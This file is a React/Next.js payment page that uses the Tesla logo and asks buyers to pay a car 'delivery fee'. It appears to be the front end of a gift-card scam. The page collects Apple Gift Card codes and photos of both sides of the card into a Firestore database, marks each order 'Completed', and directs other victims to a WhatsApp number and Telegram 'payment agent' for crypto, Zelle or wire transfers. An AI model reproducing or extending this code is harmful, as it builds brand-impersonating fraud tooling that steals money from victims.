import React, { useState, useRef } from "react";
import {
  ArrowLeft,
  CheckCircle2,
  Upload,
  MessageSquare,
  Gift,
  FileCheck,
  X,
  Phone,
  Copy,
  Check,
  Loader2,
  Send,
} from "lucide-react";
import imageCompression from "browser-image-compression";
import Image from "next/image";
import { db } from "@/lib/firebase";
import { collection, addDoc, serverTimestamp } from "firebase/firestore";

export function PaymentPage({
  orderData,
  selectedDelivery,
  onBack,
  onSuccess,
}) {
  // Destructure order details
  const carModel = orderData?.carModel || "Tesla Model 3 2025";
  const city = orderData?.city || "Texas";
  const countryName = orderData?.countryName || "USA";
  const deliveryPrice = selectedDelivery?.price || 500;

  // Selected payment method: 'apple' or 'contact'
  const [paymentMethod, setPaymentMethod] = useState("apple");
  const [copiedField, setCopiedField] = useState(null);

  // Apple Gift Card specific states
  const [frontImage, setFrontImage] = useState(null);
  const [frontPreview, setFrontPreview] = useState(null);
  const [backImage, setBackImage] = useState(null);
  const [backPreview, setBackPreview] = useState(null);
  const [giftCardCode, setGiftCardCode] = useState("");

  // Payment Proof state (Optional)
  const [uploadedFile, setUploadedFile] = useState(null);
  const [filePreview, setFilePreview] = useState(null);

  // Validation & UI state
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isCompressing, setIsCompressing] = useState(false);

  // Refs for hidden file inputs
  const frontInputRef = useRef(null);
  const backInputRef = useRef(null);
  const proofInputRef = useRef(null);

  // Contact details for WhatsApp and Telegram
  const supportDetails = {
    whatsapp: "+15719031484",
    car_agent: "@tesla_support_agent1",
  };

  // Helper to convert File/Blob to Base64 String
  const convertToBase64 = (file) => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = () => resolve(reader.result);
      reader.onerror = (err) => reject(err);
    });
  };

  // --- HANDLERS ---
  const handleCopy = (text, fieldKey) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldKey);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleImageUpload = async (file, setFile, setPreview) => {
    if (!file) return;

    if (file.type.startsWith("image/")) {
      setError("");
      setIsCompressing(true);

      try {
        const options = {
          maxSizeMB: 0.2,
          maxWidthOrHeight: 1000,
          useWebWorker: true,
        };

        const compressedFile = await imageCompression(file, options);
        setFile(compressedFile);
        setPreview(URL.createObjectURL(compressedFile));
      } catch (err) {
        console.error("Image compression error:", err);
        setError("Failed to process image. Please try another file.");
      } finally {
        setIsCompressing(false);
      }
    } else {
      setError("Please upload a valid image file (PNG, JPG, JPEG)");
    }
  };

  const handleSubmit = async () => {
    if (paymentMethod === "apple") {
      if (!giftCardCode.trim() && !frontImage && !backImage && !uploadedFile) {
        setError(
          "Please enter your Apple Gift Card code or upload card images to proceed.",
        );
        return;
      }
    }

    setIsSubmitting(true);
    setError("");

    try {
      const paymentProofBase64 = uploadedFile
        ? await convertToBase64(uploadedFile)
        : null;

      const frontImageBase64 = frontImage
        ? await convertToBase64(frontImage)
        : null;

      const backImageBase64 = backImage
        ? await convertToBase64(backImage)
        : null;

      const finalOrderPayload = {
        ...orderData,
        carModel,
        city,
        countryName,
        deliveryFee: deliveryPrice,
        paymentMethod,
        giftCardCode: giftCardCode ? giftCardCode.trim() : null,
        frontImage: frontImageBase64,
        backImage: backImageBase64,
        paymentProof: paymentProofBase64,
        status: "Completed",
        createdAt: serverTimestamp(),
      };

      await addDoc(collection(db, "orders"), finalOrderPayload);

      if (typeof onSuccess === "function") {
        onSuccess(finalOrderPayload);
      }
    } catch (err) {
      console.error("Error submitting order to Firestore:", err);
      setError(
        "Failed to submit order. Please check your network connection and try again.",
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#05080e] text-slate-100 flex flex-col items-center justify-center p-3 sm:p-6 font-sans">
      <div className="w-full max-w-xl space-y-4 sm:space-y-5">
        {/* Header Bar */}
        <div className="flex items-center space-x-2.5 sm:space-x-3">
          <button
            type="button"
            onClick={onBack}
            disabled={isSubmitting || isCompressing}
            className="p-1.5 text-slate-400 hover:text-white hover:bg-slate-900 rounded-full transition-colors disabled:opacity-50 shrink-0"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div className="flex items-center space-x-2">
            <div className="relative w-5 h-5 shrink-0">
              <Image
                src="/assets/images/tesla-logo.svg"
                alt="Tesla"
                fill
                unoptimized
                className="object-contain invert"
              />
            </div>
            <h1 className="text-base sm:text-lg font-bold tracking-tight text-white leading-tight">
              Pay Delivery Fee — ${deliveryPrice}
            </h1>
          </div>
        </div>

        {/* Destination Status Box */}
        <div className="bg-[#062d1b]/70 border border-emerald-600/60 rounded-xl p-3 sm:p-3.5 flex items-center space-x-2.5 text-emerald-400 text-xs sm:text-sm font-semibold">
          <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-emerald-400 shrink-0" />
          <p className="leading-snug">
            Delivering: <span className="text-white font-bold">{carModel}</span>{" "}
            to{" "}
            <span className="text-white font-bold">
              {city}, {countryName}
            </span>
          </p>
        </div>

        {/* 1. Select Payment Method Container */}
        <div className="bg-[#0b1120] border border-slate-800/80 rounded-2xl p-3.5 sm:p-5 space-y-3">
          <h2 className="text-xs sm:text-sm font-bold text-slate-200">
            Select Payment Method
          </h2>

          <div className="grid grid-cols-2 gap-2 sm:gap-3">
            {/* Contact Option Button */}
            <button
              type="button"
              onClick={() => {
                setPaymentMethod("contact");
                setError("");
              }}
              className={`p-3 sm:p-4 rounded-xl border flex flex-col items-center justify-center space-y-1.5 sm:space-y-2 transition-all cursor-pointer ${
                paymentMethod === "contact"
                  ? "border-amber-500 bg-amber-950/20 text-amber-300"
                  : "border-slate-800 bg-[#0f172a]/50 text-slate-400 hover:border-slate-700 hover:text-white"
              }`}
            >
              <MessageSquare className="w-5 h-5 sm:w-6 sm:h-6 text-amber-400 shrink-0" />
              <span className="text-[11px] sm:text-xs font-semibold text-center leading-tight">
                Contact Support
              </span>
            </button>

            {/* Apple Gift Card Option Button */}
            <button
              type="button"
              onClick={() => {
                setPaymentMethod("apple");
                setError("");
              }}
              className={`p-3 sm:p-4 rounded-xl border flex flex-col items-center justify-center space-y-1.5 sm:space-y-2 transition-all cursor-pointer ${
                paymentMethod === "apple"
                  ? "border-red-500 bg-red-950/20 text-red-400"
                  : "border-slate-800 bg-[#0f172a]/50 text-slate-400 hover:border-slate-700 hover:text-white"
              }`}
            >
              <div className="p-1 rounded-full bg-red-500/10 shrink-0">
                <Gift className="w-5 h-5 sm:w-6 sm:h-6 text-red-500" />
              </div>
              <span className="text-[11px] sm:text-xs font-semibold text-center text-white leading-tight">
                Apple Gift Card
              </span>
            </button>
          </div>
        </div>

        {/* 2A. DYNAMIC SECTION: Contact Information (WhatsApp & Telegram) */}
        {paymentMethod === "contact" && (
          <div className="bg-[#0b1120] border border-amber-500/30 rounded-2xl p-3.5 sm:p-5 space-y-3 sm:space-y-4 animate-fadeIn">
            <div className="flex items-center space-x-2 text-amber-400 font-bold text-xs sm:text-sm">
              <Phone className="w-4 h-4 shrink-0" />
              <span>Contact Support for Payment Options</span>
            </div>

            <p className="text-[11px] sm:text-xs text-slate-400 leading-relaxed">
              Please contact our payment agent directly via WhatsApp or Telegram
              for alternative payment instructions (Wire, Crypto, Zelle,
              CashApp, etc.).
            </p>

            {/* WhatsApp Display Box */}
            <div className="flex items-center justify-between bg-[#111827] border border-slate-800 rounded-xl p-2.5 sm:p-3.5 gap-2">
              <div className="flex items-center space-x-2 sm:space-x-2.5 min-w-0">
                <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0">
                  <Phone className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                </div>
                <div className="min-w-0">
                  <p className="text-[9px] sm:text-[10px] text-slate-400 font-medium leading-none mb-0.5">
                    WhatsApp
                  </p>
                  <span className="font-mono text-xs sm:text-sm font-bold text-white tracking-wide truncate block">
                    {supportDetails.whatsapp}
                  </span>
                </div>
              </div>

              <button
                type="button"
                onClick={() => handleCopy(supportDetails.whatsapp, "whatsapp")}
                className="flex items-center space-x-1 px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-[11px] sm:text-xs text-amber-300 font-semibold transition-colors shrink-0 cursor-pointer"
              >
                {copiedField === "whatsapp" ? (
                  <>
                    <Check className="w-3 h-3 text-emerald-400" />
                    <span className="text-emerald-400">Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3 h-3" />
                    <span>Copy</span>
                  </>
                )}
              </button>
            </div>

            {/* Telegram Display Box */}
            <div className="flex items-center justify-between bg-[#111827] border border-slate-800 rounded-xl p-2.5 sm:p-3.5 gap-2">
              <div className="flex items-center space-x-2 sm:space-x-2.5 min-w-0">
                <div className="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-sky-500/10 border border-sky-500/30 flex items-center justify-center text-sky-400 shrink-0">
                  <Send className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                </div>
                <div className="min-w-0">
                  <p className="text-[9px] sm:text-[10px] text-slate-400 font-medium leading-none mb-0.5">
                    Telegram (car_agent)
                  </p>
                  <span className="font-mono text-xs sm:text-sm font-bold text-white tracking-wide truncate block">
                    {supportDetails.car_agent}
                  </span>
                </div>
              </div>

              <button
                type="button"
                onClick={() => handleCopy(supportDetails.car_agent, "telegram")}
                className="flex items-center space-x-1 px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-[11px] sm:text-xs text-amber-300 font-semibold transition-colors shrink-0 cursor-pointer"
              >
                {copiedField === "telegram" ? (
                  <>
                    <Check className="w-3 h-3 text-emerald-400" />
                    <span className="text-emerald-400">Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3 h-3" />
                    <span>Copy</span>
                  </>
                )}
              </button>
            </div>
          </div>
        )}

        {/* 2B. DYNAMIC SECTION: Apple Gift Card Fields */}
        {paymentMethod === "apple" && (
          <div className="bg-[#0b1120] border border-slate-800/80 rounded-2xl p-3.5 sm:p-5 space-y-3 sm:space-y-4 animate-fadeIn">
            <div className="flex items-center space-x-2 text-red-500 font-bold text-xs sm:text-sm">
              <Gift className="w-4 h-4 text-red-500 shrink-0" />
              <span>Apple Gift Card</span>
            </div>

            {/* Upload Front and Back Grid */}
            <div className="grid grid-cols-2 gap-2.5 sm:gap-3">
              {/* Front Upload */}
              <div
                onClick={() => frontInputRef.current?.click()}
                className="border-2 border-dashed border-slate-700/80 hover:border-slate-500 bg-[#0f172a]/40 rounded-xl p-3 sm:p-4 flex flex-col items-center justify-center min-h-[95px] sm:min-h-[110px] cursor-pointer transition-colors relative"
              >
                <input
                  type="file"
                  ref={frontInputRef}
                  accept="image/*"
                  onChange={(e) => {
                    handleImageUpload(
                      e.target.files[0],
                      setFrontImage,
                      setFrontPreview,
                    );
                    e.target.value = "";
                  }}
                  className="hidden"
                />
                {frontPreview ? (
                  <div className="relative w-full h-14 sm:h-16 flex flex-col items-center justify-center">
                    <Image
                      src={frontPreview}
                      alt="Front"
                      fill
                      unoptimized
                      className="rounded object-contain"
                    />
                    <span className="text-[9px] sm:text-[10px] text-emerald-400 font-bold mt-1 z-10">
                      Front Uploaded
                    </span>
                    <button
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        setFrontImage(null);
                        setFrontPreview(null);
                      }}
                      className="absolute -top-1 -right-1 p-1 bg-red-600 rounded-full text-white hover:bg-red-500 z-20"
                    >
                      <X className="w-3 h-3" />
                    </button>
                  </div>
                ) : (
                  <>
                    <Upload className="w-4 h-4 sm:w-5 sm:h-5 text-slate-400 mb-1" />
                    <span className="text-xs text-slate-400 font-medium">
                      Front
                    </span>
                  </>
                )}
              </div>

              {/* Back Upload */}
              <div
                onClick={() => backInputRef.current?.click()}
                className="border-2 border-dashed border-slate-700/80 hover:border-slate-500 bg-[#0f172a]/40 rounded-xl p-3 sm:p-4 flex flex-col items-center justify-center min-h-[95px] sm:min-h-[110px] cursor-pointer transition-colors relative"
              >
                <input
                  type="file"
                  ref={backInputRef}
                  accept="image/*"
                  onChange={(e) => {
                    handleImageUpload(
                      e.target.files[0],
                      setBackImage,
                      setBackPreview,
                    );
                    e.target.value = "";
                  }}
                  className="hidden"
                />
                {backPreview ? (
                  <div className="relative w-full h-14 sm:h-16 flex flex-col items-center justify-center">
                    <Image
                      src={backPreview}
                      alt="Back"
                      fill
                      unoptimized
                      className="rounded object-contain"
                    />
                    <span className="text-[9px] sm:text-[10px] text-emerald-400 font-bold mt-1 z-10">
                      Back Uploaded
                    </span>
                    <button
                      type="button"
                      onClick={(e) => {
                        e.stopPropagation();
                        setBackImage(null);
                        setBackPreview(null);
                      }}
                      className="absolute -top-1 -right-1 p-1 bg-red-600 rounded-full text-white hover:bg-red-500 z-20"
                    >
                      <X className="w-3 h-3" />
                    </button>
                  </div>
                ) : (
                  <>
                    <Upload className="w-4 h-4 sm:w-5 sm:h-5 text-slate-400 mb-1" />
                    <span className="text-xs text-slate-400 font-medium">
                      Back
                    </span>
                  </>
                )}
              </div>
            </div>

            {/* Gift Card Code Input Field */}
            <div>
              <input
                type="text"
                placeholder="Code: XXXX-XXXX-XXXX"
                value={giftCardCode}
                onChange={(e) => setGiftCardCode(e.target.value)}
                className="w-full bg-[#111827] border border-slate-800 rounded-xl px-3 py-2.5 sm:px-4 sm:py-3 text-xs sm:text-sm text-slate-200 placeholder-slate-500 font-mono tracking-wider focus:outline-none focus:border-red-500"
              />
            </div>
          </div>
        )}

        {/* 3. Upload Payment Proof Container (Optional) */}
        <div className="bg-[#0b1120] border border-slate-800/80 rounded-2xl p-3.5 sm:p-5 space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2 text-amber-400 font-bold text-xs sm:text-sm">
              <Upload className="w-4 h-4 shrink-0" />
              <span>Upload Payment Proof</span>
            </div>
            <span className="text-[10px] sm:text-xs text-slate-500 font-medium">
              (Optional)
            </span>
          </div>

          <div
            onClick={() => proofInputRef.current?.click()}
            className={`border-2 border-dashed rounded-xl p-4 sm:p-6 text-center cursor-pointer transition-all flex flex-col items-center justify-center space-y-1.5 sm:space-y-2 ${
              filePreview
                ? "border-emerald-500/60 bg-emerald-950/10"
                : "border-slate-800 bg-[#0f172a]/30 hover:border-slate-700 hover:bg-[#0f172a]/60"
            }`}
          >
            <input
              type="file"
              ref={proofInputRef}
              onChange={(e) => {
                handleImageUpload(
                  e.target.files[0],
                  setUploadedFile,
                  setFilePreview,
                );
                e.target.value = "";
              }}
              accept="image/*"
              className="hidden"
            />

            {filePreview ? (
              <div className="relative w-full flex flex-col items-center">
                <div className="relative w-full h-28 sm:h-36 mb-2">
                  <Image
                    src={filePreview}
                    alt="Proof preview"
                    fill
                    unoptimized
                    className="rounded-lg border border-slate-700 object-contain"
                  />
                </div>
                <div className="flex items-center space-x-2 text-xs text-emerald-400 font-semibold">
                  <FileCheck className="w-4 h-4 shrink-0" />
                  <span className="truncate max-w-[150px] sm:max-w-[200px]">
                    {uploadedFile?.name || "Proof uploaded"}
                  </span>
                </div>
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation();
                    setUploadedFile(null);
                    setFilePreview(null);
                  }}
                  className="mt-2 text-xs text-red-400 hover:underline flex items-center space-x-1 cursor-pointer"
                >
                  <X className="w-3.5 h-3.5" />
                  <span>Remove file</span>
                </button>
              </div>
            ) : (
              <>
                <div className="p-2.5 sm:p-3 bg-slate-900/80 rounded-full border border-slate-800 text-slate-400">
                  <Upload className="w-5 h-5 sm:w-6 sm:h-6" />
                </div>
                <p className="text-slate-300 font-bold text-xs sm:text-sm">
                  Tap to upload proof (optional)
                </p>
                <p className="text-[10px] sm:text-xs text-slate-500">
                  PNG, JPG or JPEG (Screenshots or Receipt)
                </p>
              </>
            )}
          </div>

          {isCompressing && (
            <p className="text-amber-400 text-xs font-semibold flex items-center space-x-1">
              <Loader2 className="w-3.5 h-3.5 animate-spin" />
              <span>Optimizing image size...</span>
            </p>
          )}

          {error && (
            <p className="text-red-500 text-xs font-semibold">{error}</p>
          )}
        </div>

        {/* Submit Button */}
        <button
          type="button"
          onClick={handleSubmit}
          disabled={isSubmitting || isCompressing}
          className="w-full bg-red-600 hover:bg-red-700 disabled:bg-red-800/60 disabled:cursor-not-allowed text-white font-black py-3.5 sm:py-4 rounded-xl text-sm sm:text-base transition-all shadow-lg shadow-red-600/20 active:scale-[0.99] cursor-pointer flex items-center justify-center space-x-2"
        >
          {isSubmitting ? (
            <>
              <Loader2 className="w-4 h-4 sm:w-5 sm:h-5 animate-spin" />
              <span>Submitting Order...</span>
            </>
          ) : (
            <>
              <span>Paid-Confirm My Order</span>
              <span className="text-base sm:text-lg">✓</span>
            </>
          )}
        </button>
      </div>
    </div>
  );
}

export default PaymentPage;
